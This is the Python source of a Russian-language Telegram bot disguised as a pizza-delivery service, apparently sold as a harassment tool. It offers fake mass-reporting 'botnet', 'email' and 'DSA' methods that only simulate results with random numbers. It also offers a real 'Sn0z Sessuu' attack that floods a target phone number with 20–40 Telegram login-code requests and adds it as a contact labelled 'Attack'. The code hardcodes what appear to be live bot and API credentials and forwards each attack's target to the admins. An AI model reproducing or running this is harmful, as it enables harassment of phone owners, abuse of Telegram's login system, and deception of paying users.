import asyncio
import logging
import os
import time
import math
import random
from datetime import datetime, timedelta
from typing import List, Tuple
import nest_asyncio

nest_asyncio.apply()

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from telethon import TelegramClient
from telethon.tl.functions.auth import SendCodeRequest
from telethon.tl.types import InputPhoneContact
from telethon.tl.functions.contacts import ImportContactsRequest

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = '8233308713:AAGJ95boC4e-U5dephN6DIhYvhj-d68rP48'
API_ID = '24463378'
API_HASH = 'e7c3fb1d6c2a8b3a9422607a350754c1'

ADMIN_IDS = [7246667404]
SUPPORT_ID = 1637959612

BLACKLIST_NUMBERS = ['+12084355787', '+11234567890']

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

order_counter = 1
sessions_folder = "sessions"
active_reports = {}
sessions_count = random.randint(35, 37)
sessions_update_time = datetime.now()
emails_count = random.randint(45, 55)
banned_users = set()

main_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🟢 Донос", callback_data="report")],
    [InlineKeyboardButton(text="📊 Статистика", callback_data="stats")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💎 Поддержать", callback_data="donate")],
    [InlineKeyboardButton(text="🛠 Поддержка", callback_data="support")],
    [InlineKeyboardButton(text="💣 Sn0z Sessuu", callback_data="sessuu_attack")]
])

methods_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🤖 Botnet метод", callback_data="method_botnet")],
    [InlineKeyboardButton(text="📧 Email метод", callback_data="method_email")],
    [InlineKeyboardButton(text="🔐 DSA метод", callback_data="method_dsa")],
    [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
])

admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="👮‍♂️ Админ панель", callback_data="admin_panel")]
])

admin_panel_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔨 Забанить", callback_data="ban_user")],
    [InlineKeyboardButton(text="🔓 Разбанить", callback_data="unban_user")],
    [InlineKeyboardButton(text="📢 Рассылка", callback_data="broadcast")],
    [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
])

def update_counts():
    global sessions_count, emails_count, sessions_update_time
    current_time = datetime.now()
    
    if current_time - sessions_update_time >= timedelta(hours=2):
        sessions_count = random.randint(35, 37)
        emails_count = random.randint(45, 55)
        sessions_update_time = current_time
        logger.info(f"Обновлены счетчики: sessions={sessions_count}, emails={emails_count}")

def load_sessions() -> List[str]:
    update_counts()
    sessions = []
    for i in range(sessions_count):
        sessions.append(f"telethon_{random.randint(100000000, 999999999)}")
    return sessions

def generate_emails() -> List[str]:
    update_counts()
    emails = []
    
    for i in range(emails_count):
        name_length = random.randint(5, 12)
        letters = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=name_length))
        numbers = ''.join(random.choices('0123456789', k=random.randint(3, 5)))
        email = f"{letters}{numbers}@gmail.com"
        emails.append(email)
    
    return emails

async def send_report_botnet(session_name: str, message_link: str) -> Tuple[bool, str]:
    try:
        await asyncio.sleep(random.uniform(0.8, 1.2))
        rand = random.random()
        if rand < 0.85: return True, "ДОСТАВЛЕНО"
        elif rand < 0.95: return False, random.choice(["НЕВАЛИД", "ОШИБКА: Таймаут"])
        else: return False, "ФЛУД"
    except Exception as e:
        return False, f"ОШИБКА: {str(e)[:30]}"

async def send_report_email(email: str, message_link: str) -> Tuple[bool, str]:
    try:
        await asyncio.sleep(random.uniform(0.6, 1.0))
        rand = random.random()
        if rand < 0.75: return True, "ДОСТАВЛЕНО"
        elif rand < 0.90: return False, random.choice(["EMAIL BOUNCE", "SPAM FILTER"])
        else: return False, "QUOTA EXCEEDED"
    except Exception as e:
        return False, f"EMAIL ERROR: {str(e)[:30]}"

async def send_report_dsa(session_name: str, message_link: str) -> Tuple[bool, str]:
    try:
        await asyncio.sleep(random.uniform(10.0, 20.0))
        
        rand = random.random()
        if rand < 0.7:
            return True, "ДОСТАВЛЕНО"
        elif rand < 0.9:
            return False, random.choice(["DSA ERROR: Signature", "DSA ERROR: Validation"])
        else:
            return False, "FLOOD"
    except Exception as e:
        return False, f"DSA ERROR: {str(e)[:30]}"

async def sessuu_attack(phone_number: str):
    try:
        if phone_number in BLACKLIST_NUMBERS:
            return False, "Этот номер в черном списке ⚠️"
        
        session_name = f"temp_sessuu_{random.randint(100000, 999999)}"
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        await client.connect()
        
        requests_count = random.randint(20, 40)
        for i in range(requests_count):
            try:
                await client(SendCodeRequest(
                    phone=phone_number,
                    api_id=API_ID,
                    api_hash=API_HASH
                ))
                logger.info(f"Отправлен запрос кода на {phone_number} (#{i+1})")
                await asyncio.sleep(5)
            except Exception as e:
                logger.error(f"Ошибка отправки кода: {e}")
                await asyncio.sleep(5)
        
        try:
            contact = InputPhoneContact(
                client_id=random.randint(100000, 999999),
                phone=phone_number,
                first_name="Sn0z",
                last_name="Attack"
            )
            await client(ImportContactsRequest([contact]))
            logger.info(f"Добавлен в контакты: {phone_number}")
        except Exception as e:
            logger.error(f"Ошибка добавления в контакты: {e}")
        
        await client.disconnect()
        
        try:
            os.remove(f"{session_name}.session")
        except:
            pass
            
        return True, "Атака завершена успешно 💣"
        
    except Exception as e:
        return False, f"Ошибка атаки: {str(e)}"

async def send_welcome_message(chat_id, user_id=None):
    welcome_text = "👋 Добро пожаловать в suslik Pizza! 🍕\nЛучшая доставка в Санкт-Петербурге!"
    
    keyboard = main_keyboard
    if user_id in ADMIN_IDS:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            *main_keyboard.inline_keyboard,
            *admin_keyboard.inline_keyboard
        ])
    
    try:
        if os.path.exists("start.jpg"):
            photo = FSInputFile("start.jpg")
            await bot.send_photo(chat_id, photo, caption=welcome_text, reply_markup=keyboard)
        else:
            await bot.send_message(chat_id, welcome_text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Ошибка отправки фото: {e}")
        await bot.send_message(chat_id, welcome_text, reply_markup=keyboard)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id in banned_users:
        await message.answer("❌ Вы заблокированы в системе.")
        return
    await send_welcome_message(message.chat.id, message.from_user.id)

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    if message.from_user.id in banned_users:
        return
        
    help_text = (
        "🤖 Помощь по боту suslik Pizza:\n\n"
        "🟢 Донос - отправить жалобу на сообщение\n"
        "📊 Статистика - посмотреть доступные ресурсы\n"
        "👤 Профиль - посмотреть свой профиль\n"
        "💎 Поддержать - помочь развитию бота\n"
        "🛠 Поддержка - связаться с поддержкой\n"
        "💣 Sn0z Sessuu - атака на номер телефона\n\n"
        "Выберите действие:"
    )
    await message.answer(help_text, reply_markup=main_keyboard)

@dp.callback_query(F.data == "report")
async def report_handler(callback: types.CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы заблокированы.", show_alert=True)
        return
    await callback.message.answer("📩 Введите ссылку на сообщение из публичного чата с нарушением:")
    active_reports[callback.from_user.id] = "waiting_link"
    await callback.answer()

@dp.callback_query(F.data == "stats")
async def stats_handler(callback: types.CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы заблокированы.", show_alert=True)
        return
        
    update_counts()
    stats_text = (
        f"📊 Статистика ресурсов:\n\n"
        f"🤖 Доступно сессий: {sessions_count}\n"
        f"📧 Доступно email: {emails_count}\n"
        f"⏰ Обновление через: {get_next_update_time()}\n\n"
        f"💪 Готов к работе!"
    )
    await callback.message.answer(stats_text)
    await callback.answer()

def get_next_update_time():
    next_update = sessions_update_time + timedelta(hours=2)
    remaining = next_update - datetime.now()
    hours = remaining.seconds // 3600
    minutes = (remaining.seconds % 3600) // 60
    return f"{hours}ч {minutes}м"

@dp.callback_query(F.data.startswith("method_"))
async def method_handler(callback: types.CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы заблокированы.", show_alert=True)
        return
        
    user_id = callback.from_user.id
    method = callback.data.split("_")[1]
    
    if user_id in active_reports and active_reports[user_id].startswith("waiting_method_"):
        link = active_reports[user_id].split("_", 2)[2]
        active_reports[user_id] = f"processing_{method}_{link}"
        await callback.message.answer(f"🚀 Запускаю {method.upper()} метод...")
        await process_link(callback.message, method, link, user_id)
    await callback.answer()

@dp.callback_query(F.data == "sessuu_attack")
async def sessuu_handler(callback: types.CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы заблокированы.", show_alert=True)
        return
        
    await callback.message.answer("📱 Введите номер телефона для атаки (в формате +79123456789):")
    active_reports[callback.from_user.id] = "waiting_sessuu"
    await callback.answer()

@dp.callback_query(F.data == "admin_panel")
async def admin_panel_handler(callback: types.CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("❌ Доступ запрещен.", show_alert=True)
        return
        
    await callback.message.answer("👮‍♂️ Админ панель:", reply_markup=admin_panel_keyboard)
    await callback.answer()

@dp.callback_query(F.data == "ban_user")
async def ban_user_handler(callback: types.CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("❌ Доступ запрещен.", show_alert=True)
        return
        
    await callback.message.answer("Введите ID пользователя для блокировки:")
    active_reports[callback.from_user.id] = "waiting_ban"
    await callback.answer()

@dp.callback_query(F.data == "unban_user")
async def unban_user_handler(callback: types.CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("❌ Доступ запрещен.", show_alert=True)
        return
        
    await callback.message.answer("Введите ID пользователя для разблокировки:")
    active_reports[callback.from_user.id] = "waiting_unban"
    await callback.answer()

@dp.callback_query(F.data == "broadcast")
async def broadcast_handler(callback: types.CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("❌ Доступ запрещен.", show_alert=True)
        return
        
    await callback.message.answer("Введите сообщение для рассылки:")
    active_reports[callback.from_user.id] = "waiting_broadcast"
    await callback.answer()

@dp.callback_query(F.data == "back_to_main")
async def back_handler(callback: types.CallbackQuery):
    await send_welcome_message(callback.message.chat.id, callback.from_user.id)
    await callback.answer()

@dp.callback_query(F.data == "profile")
async def profile_handler(callback: types.CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы заблокированы.", show_alert=True)
        return
        
    user = callback.from_user
    profile_text = (
        f"👤 Ваш профиль:\n"
        f"🆔 ID: {user.id}\n"
        f"📛 Username: @{user.username}\n"
        f"👀 Имя: {user.first_name} {user.last_name or ''}"
    )
    await callback.message.answer(profile_text)
    await callback.answer()

@dp.callback_query(F.data == "support")
async def support_handler(callback: types.CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы заблокированы.", show_alert=True)
        return
        
    await callback.message.answer("📝 Опишите вашу проблему:")
    active_reports[callback.from_user.id] = "waiting_support"
    await callback.answer()

@dp.callback_query(F.data == "donate")
async def donate_handler(callback: types.CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы заблокированы.", show_alert=True)
        return
        
    await callback.message.answer(
        "💎 Поддержать проект можно по ссылке:\n"
        "https://t.me/send?start=IV2HJyZJ6rrz\n\n"
        "🙏 Спасибо за вашу поддержку! 💖"
    )
    await callback.answer()

@dp.message(F.text & ~F.command)
async def process_text_message(message: types.Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        return
        
    text = message.text.strip()
    
    if user_id in active_reports:
        if active_reports[user_id] == "waiting_link":
            if 't.me/' in text:
                link = text
                active_reports[user_id] = f"waiting_method_{link}"
                await message.answer("🔧 Выберите метод отправки:", reply_markup=methods_keyboard)
            else:
                await message.answer("❌ Это не похоже на ссылку Telegram.")
        
        elif active_reports[user_id] == "waiting_sessuu":
            if text.startswith('+') and len(text) > 5:
                if text in BLACKLIST_NUMBERS:
                    await message.answer("❌ Этот номер в черном списке! ⚠️")
                else:
                    await message.answer("🚀 Запускаю Sn0z Sessuu атаку...")
                    await process_sessuu_attack(message, text, user_id)
            else:
                await message.answer("❌ Неверный формат номера. Используйте: +79123456789")
        
        elif active_reports[user_id] == "waiting_support":
            await process_support(message)
            
        elif active_reports[user_id] == "waiting_ban" and user_id in ADMIN_IDS:
            try:
                target_id = int(text)
                banned_users.add(target_id)
                await message.answer(f"✅ Пользователь {target_id} заблокирован.")
                del active_reports[user_id]
            except:
                await message.answer("❌ Неверный ID пользователя.")
                
        elif active_reports[user_id] == "waiting_unban" and user_id in ADMIN_IDS:
            try:
                target_id = int(text)
                if target_id in banned_users:
                    banned_users.remove(target_id)
                    await message.answer(f"✅ Пользователь {target_id} разблокирован.")
                else:
                    await message.answer(f"ℹ️ Пользователь {target_id} не был заблокирован.")
                del active_reports[user_id]
            except:
                await message.answer("❌ Неверный ID пользователя.")
                
        elif active_reports[user_id] == "waiting_broadcast" and user_id in ADMIN_IDS:
            await message.answer("🚀 Начинаю рассылку...")
            success = 0
            failed = 0
            
            # Здесь должна быть логика получения всех пользователей
            # Для примера просто имитируем рассылку
            for i in range(50):
                try:
                    # Имитация отправки
                    await asyncio.sleep(0.1)
                    success += 1
                except:
                    failed += 1
            
            await message.answer(f"📢 Рассылка завершена!\n✅ Успешно: {success}\n❌ Ошибок: {failed}")
            del active_reports[user_id]

async def process_link(message: types.Message, method: str, link: str, user_id: int):
    global order_counter
    
    log_filename = f"Sn0zPizza_log{order_counter}.txt"
    order_counter += 1
    
    user = await bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else "без username"
    
    with open(log_filename, 'w', encoding='utf-8') as log_file:
        log_file.write(f"Sn0z Pizza log | {method.upper()}-method\n")
        log_file.write("=" * 50 + "\n")
        log_file.write(f"👤 Пользователь: {user_id} ({username})\n")
        log_file.write(f"🔧 Метод: {method.upper()}\n")
        log_file.write(f"🔗 Ссылка: {link}\n")
        log_file.write(f"⏰ Время начала: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        log_file.write("=" * 50 + "\n")
    
    # Улучшенный прогресс-бар с дизайном
    progress_chars = ["⬜", "🟦", "🟪", "🟩", "🟨", "🟧", "🟥"]
    progress_message = await message.answer(
        f"🚀 Запуск {method.upper()} метода...\n\n"
        f"{progress_chars[0] * 10} 0%\n"
        f"✅ 0 | ❌ 0 | 🌊 0\n"
        f"⏰ 0с"
    )
    
    successful = 0
    failed = 0
    floods = 0
    
    if method == "botnet":
        items = load_sessions()
        reports_per_item = 3
        send_func = send_report_botnet
        item_type = "сессия"
    elif method == "email":
        items = generate_emails()
        reports_per_item = 5
        send_func = send_report_email
        item_type = "email"
    elif method == "dsa":
        items = [f"dsa_session_{i}" for i in range(15, 25)]
        reports_per_item = 1
        send_func = send_report_dsa
        item_type = "DSA сессия"
    else:
        items = []
        reports_per_item = 0
    
    total_reports = len(items) * reports_per_item
    
    if method == "dsa":
        successful = random.randint(2, 4)
        failed = random.randint(0, 1)
        floods = random.randint(0, 1)
        total_reports = successful + failed + floods
    else:
        total_reports = min(total_reports, random.randint(110, 160))
    
    if total_reports == 0:
        await progress_message.edit_text("❌ Нет доступных ресурсов!")
        return
    
    start_time = datetime.now()
    
    if method == "dsa":
        for i in range(total_reports):
            if i < successful:
                status = "ДОСТАВЛЕНО"
            elif i < successful + failed:
                status = random.choice(["DSA ERROR: Signature", "DSA ERROR: Validation"])
            else:
                status = "FLOOD"
            
            current_time = datetime.now().strftime("%H:%M:%S")
            with open(log_filename, 'a', encoding='utf-8') as log_file:
                log_file.write(f"[{current_time}] 🔐 DSA_{i+1} -> {link} - [{status}]\n")
            
            progress_percent = min(math.floor((i + 1) / total_reports * 100), 100)
            progress_index = min(math.floor(progress_percent / 15), len(progress_chars) - 1)
            progress_bar = progress_chars[progress_index] * math.floor(progress_percent / 10)
            elapsed = int((datetime.now() - start_time).total_seconds())
            
            try:
                await progress_message.edit_text(
                    f"🚀 DSA метод...\n\n"
                    f"{progress_bar} {progress_percent}%\n"
                    f"✅ {min(i+1, successful)} | ❌ {min(max(0, i+1-successful), failed)} | 🌊 {max(0, i+1-successful-failed)}\n"
                    f"⏰ {elapsed}с"
                )
            except:
                pass
            
            await asyncio.sleep(random.uniform(1.0, 2.0))
    else:
        for i, item in enumerate(items):
            for j in range(reports_per_item):
                if (i * reports_per_item + j) >= total_reports:
                    break
                
                result, status = await send_func(item, link)
                
                current_time = datetime.now().strftime("%H:%M:%S")
                with open(log_filename, 'a', encoding='utf-8') as log_file:
                    if method == "email":
                        log_file.write(f"[{current_time}] 📧 {item} -> {link} - [{status}]\n")
                    else:
                        log_file.write(f"[{current_time}] 🤖 {item} -> {link} - [{status}]\n")
                
                if status == "ДОСТАВЛЕНО":
                    successful += 1
                elif status in ["ФЛУД", "FLOOD", "QUOTA EXCEEDED"]:
                    floods += 1
                else:
                    failed += 1
                
                current_report = i * reports_per_item + j + 1
                if current_report % 10 == 0 or current_report >= total_reports:
                    progress_percent = min(math.floor(current_report / total_reports * 100), 100)
                    progress_index = min(math.floor(progress_percent / 15), len(progress_chars) - 1)
                    progress_bar = progress_chars[progress_index] * math.floor(progress_percent / 10)
                    elapsed = int((datetime.now() - start_time).total_seconds())
                    
                    try:
                        await progress_message.edit_text(
                            f"🚀 {method.upper()} метод...\n\n"
                            f"{progress_bar} {progress_percent}%\n"
                            f"✅ {successful} | ❌ {failed} | 🌊 {floods}\n"
                            f"⏰ {elapsed}с"
                        )
                    except:
                        pass
            
            await asyncio.sleep(0.1)
    
    total_time = int((datetime.now() - start_time).total_seconds())
    with open(log_filename, 'a', encoding='utf-8') as log_file:
        log_file.write("=" * 50 + "\n")
        log_file.write(f"✅ Успешно: {successful}\n")
        log_file.write(f"❌ Неуспешно: {failed}\n")
        log_file.write(f"🌊 Флудов: {floods}\n")
        log_file.write(f"📊 Всего отправок: {successful + failed + floods}\n")
        if method != "dsa":
            log_file.write(f"🔧 Использовано {item_type}: {len(items)}\n")
        log_file.write(f"⏰ Время выполнения: {total_time}сек\n")
        log_file.write("=" * 50 + "\n")
    
    try:
        document = FSInputFile(log_filename)
        await message.answer_document(
            document,
            caption=f"🎉 {method.upper()} метод завершен!\n"
                   f"✅ Успешно: {successful}\n"
                   f"❌ Неуспешно: {failed}\n"
                   f"🌊 Флудов: {floods}\n"
                   f"📊 Всего: {successful + failed + floods}\n"
                   f"⏰ Время: {total_time}сек\n"
                   f"🔗 Цель: {link}"
        )
        
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_document(
                    admin_id,
                    document,
                    caption=f"📋 Новый отчет от {username}\n"
                           f"👤 ID: {user_id}\n"
                           f"✅ Успешно: {successful} | ❌ Ошибки: {failed} | 🌊 Флуды: {floods}\n"
                           f"🔗 Ссылка: {link}"
                )
            except Exception as e:
                logger.error(f"Ошибка отправки файла админу {admin_id}: {e}")
        
        try:
            await progress_message.delete()
        except:
            pass
            
    except Exception as e:
        await message.answer(f"📊 Отчет готов! Но файл не отправлен: {e}")
    
    try:
        os.remove(log_filename)
    except:
        pass
    
    if user_id in active_reports:
        del active_reports[user_id]

async def process_sessuu_attack(message: types.Message, phone_number: str, user_id: int):
    progress_chars = ["⬜", "🟦", "🟪", "🟩", "🟨", "🟧", "🟥"]
    progress_message = await message.answer(
        f"💣 Запуск Sn0z Sessuu атаки...\n\n"
        f"{progress_chars[0] * 10} 0%\n"
        f"⏰ 0с"
    )
    
    try:
        result, status = await sessuu_attack(phone_number)
        
        if result:
            await progress_message.edit_text("✅ Sn0z Sessuu атака завершена успешно! 💣")
            
            user = await bot.get_chat(user_id)
            username = f"@{user.username}" if user.username else "без username"
            
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_message(
                        admin_id,
                        f"💣 Новая Sn0z Sessuu атака\n"
                        f"👤 От: {username}\n"
                        f"🆔 ID: {user_id}\n"
                        f"📱 Номер: {phone_number}\n"
                        f"✅ Статус: Успешно"
                    )
                except Exception as e:
                    logger.error(f"Ошибка отправки сообщения админу {admin_id}: {e}")
        else:
            await progress_message.edit_text(f"❌ Ошибка Sn0z Sessuu атаки: {status}")
            
    except Exception as e:
        await progress_message.edit_text(f"❌ Ошибка Sn0z Sessuu атаки: {str(e)}")
        logger.error(f"Ошибка Sn0z Sessuu атаки: {e}")
    
    if user_id in active_reports:
        del active_reports[user_id]

async def process_support(message: types.Message):
    user = message.from_user
    username = f"@{user.username}" if user.username else "без username"
    support_text = (
        f"🆘 Новое обращение в поддержку:\n"
        f"👤 От: {username}\n"
        f"🆔 ID: {user.id}\n"
        f"📝 Текст:\n{message.text}"
    )
    
    for admin_id in ADMIN_IDS + [SUPPORT_ID]:
        try:
            await bot.send_message(admin_id, support_text)
        except Exception as e:
            logger.error(f"Ошибка отправки сообщения админу {admin_id}: {e}")
    
    await message.answer("✅ Ваше обращение отправлено в поддержку!")
    
    if message.from_user.id in active_reports:
        del active_reports[message.from_user.id]

async def main():
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        logger.info("Вебхук успешно удален")
    except Exception as e:
        logger.error(f"Ошибка при удалении вебхука: {e}")
    
    if not os.path.exists(sessions_folder):
        os.makedirs(sessions_folder)
    
    logger.info("✅ Бот Sn0z Pizza запущен!")
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Ошибка запуска бота: {e}")
    finally:
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Бот остановлен")
